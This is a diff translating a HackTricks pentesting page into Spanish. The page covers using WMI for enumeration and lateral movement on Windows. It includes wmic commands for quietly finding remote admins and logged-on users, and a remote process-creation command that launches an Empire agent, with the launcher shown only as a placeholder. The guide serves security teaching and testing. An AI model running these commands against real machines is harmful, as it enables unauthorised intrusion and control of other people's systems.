@@ -4,31 +4,30 @@
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+- ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
 
-- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 
-- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
+- Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
 
-- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+- **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 
-- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+- **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
 
-## How Does it works
+## ¿Cómo funciona?
 
-Wmi allows to open process in hosts where you know username/(password/Hash). Then, Wmiexec uses wmi to execute each command that is asked to execute (this is why Wmicexec gives you semi-interactive shell).
+Wmi permite abrir procesos en hosts donde se conoce el nombre de usuario/(contraseña/Hash). Luego, Wmiexec utiliza wmi para ejecutar cada comando que se le pide que ejecute (por eso Wmicexec te da una shell semi-interactiva).
 
-**dcomexec.py:** This script gives a semi-interactive shell similar to wmiexec.py, but using different DCOM endpoints (ShellBrowserWindow DCOM object). Currently, it supports MMC20. Application, Shell Windows and Shell Browser Window objects. (from [here](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))
+**dcomexec.py:** Este script proporciona una shell semi-interactiva similar a wmiexec.py, pero utilizando diferentes puntos finales DCOM (objeto DCOM ShellBrowserWindow). Actualmente, admite MMC20. Aplicación, ventanas de shell y objetos de ventana del navegador de shell. (de [aquí](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))
 
-## WMI Basics
+## Conceptos básicos de WMI
 
-### Namespace
+### Espacio de nombres
 
-WMI is divided into a directory-style hierarchy, the \root container, with other directories under \root. These "directory paths" are called namespaces.\
-List namespaces:
-
+WMI se divide en una jerarquía de estilo de directorio, el contenedor \root, con otros directorios bajo \root. Estas "rutas de directorio" se llaman espacios de nombres.\
+Listar espacios de nombres:
 ```bash
 #Get Root namespaces
 gwmi -namespace "root" -Class "__Namespace" | Select Name
@@ -39,36 +38,28 @@ Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | s
 #List namespaces inside "root\cimv2"
 Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
 ```
-
-List classes of a namespace with:
-
+Lista las clases de un espacio de nombres con:
 ```bash
 gwmwi -List -Recurse #If no namespace is specified, by default is used: "root\cimv2"
 gwmi -Namespace "root/microsoft" -List -Recurse
 ```
+### **Clases**
 
-### **Classes**
-
-The WMI class name eg: win32\_process is a starting point for any WMI action. We always need to know a Class Name and the Namespace where it is located.\
-List classes starting with `win32`:
-
+El nombre de la clase WMI, por ejemplo, win32\_process, es un punto de partida para cualquier acción de WMI. Siempre necesitamos conocer el nombre de la clase y el espacio de nombres donde se encuentra.\
+Lista de clases que comienzan con `win32`:
 ```bash
 Get-WmiObject -Recurse -List -class win32* | more #If no namespace is specified, by default is used: "root\cimv2"
 gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
 ```
-
-Call a class:
-
+Llamar a una clase:
 ```bash
 #When you don't specify a namespaces by default is "root/cimv2"
 Get-WmiObject -Class win32_share
 Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpComputerStatus
 ```
+### Métodos
 
-### Methods
-
-WMI classes have one or more functions that can be executed. These functions are called methods.
-
+Las clases de WMI tienen una o más funciones que pueden ser ejecutadas. Estas funciones se llaman métodos.
 ```bash
 #Load a class using [wmiclass], leist methods and call one
 $c = [wmiclass]"win32_share"
@@ -84,13 +75,11 @@ Get-WmiObject -Query 'Select * From Meta_Class WHERE __Class LIKE "win32%"' | Wh
 #Call create method from win32_share class
 Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Description", $null, "Name", $null, "c:\share\path",0)
 ```
+## Enumeración de WMI
 
-## WMI Enumeration
+### Verificar el servicio de WMI
 
-### Check WMI service
-
-This how you can check if WMI service is running:
-
+Así es como puedes verificar si el servicio de WMI está en ejecución:
 ```bash
 #Check if WMI service is running
 Get-Service Winmgmt
@@ -101,21 +90,15 @@ Running  Winmgmt            Windows Management Instrumentation
 #From CMD
 net start | findstr "Instrumentation"
 ```
-
-### System Information
-
+### Información del sistema
 ```bash
 Get-WmiObject -ClassName win32_operatingsystem | select * | more
 ```
-
-### Process Information
-
+### Información del Proceso
 ```bash
 Get-WmiObject win32_process | Select Name, Processid
 ```
-
-From an attacker's perspective, WMI can be very valuable in enumerating sensitive information about a system or the domain.
-
+Desde la perspectiva de un atacante, WMI puede ser muy valioso para enumerar información sensible sobre un sistema o el dominio.
 ```
 wmic computerystem list full /format:list  
 wmic process list /format:list  
@@ -128,49 +111,24 @@ wmic sysaccount list /format:list
 ```bash
  Get-WmiObject Win32_Processor -ComputerName 10.0.0.182 -Credential $cred
 ```
+## **Consulta remota manual de WMI**
 
-## **Manual Remote WMI Querying**
-
-For example, here's a very stealthy way to discover local admins on a remote machine (note that domain is the computer name):
-
+Por ejemplo, aquí hay una forma muy sigilosa de descubrir administradores locales en una máquina remota (tenga en cuenta que el dominio es el nombre de la computadora):
 ```bash
 wmic /node:ordws01 path win32_groupuser where (groupcomponent="win32_group.name=\"administrators\",domain=\"ORDWS01\"")  
 ```
-
-Another useful oneliner is to see who is logged on to a machine (for when you're hunting admins):
-
+Otro comando útil en una sola línea es ver quién ha iniciado sesión en una máquina (para cuando estás buscando administradores):
 ```
 wmic /node:ordws01 path win32_loggedonuser get antecedent  
 ```
-
-`wmic` can even read nodes from a text file and execute the command on all of them. If you have a text file of workstations:
-
+`wmic` incluso puede leer nodos desde un archivo de texto y ejecutar el comando en todos ellos. Si tienes un archivo de texto con estaciones de trabajo:
 ```
 wmic /node:@workstations.txt path win32_loggedonuser get antecedent  
 ```
-
-**We'll remotely create a process over WMI to execute a Empire agent:**
-
+Crearemos de forma remota un proceso a través de WMI para ejecutar un agente de Empire.
 ```bash
 wmic /node:ordws01 /user:CSCOU\jarrieta path win32_process call create "**empire launcher string here**"  
 ```
+Vemos que se ejecuta con éxito (ReturnValue = 0). Y un segundo después, nuestro listener de Empire lo captura. Tenga en cuenta que el ID del proceso es el mismo que devolvió WMI.
 
-We see it executed successfully (ReturnValue = 0). And a second later our Empire listener catches it. Note the process ID is the same as WMI returned.
-
-All this information was extracted from here: [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
-
-<details>
-
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
-
-- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-
-- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-
-- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-
-- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-
-- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
-
-</details>
+Toda esta información fue extraída de aquí: [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
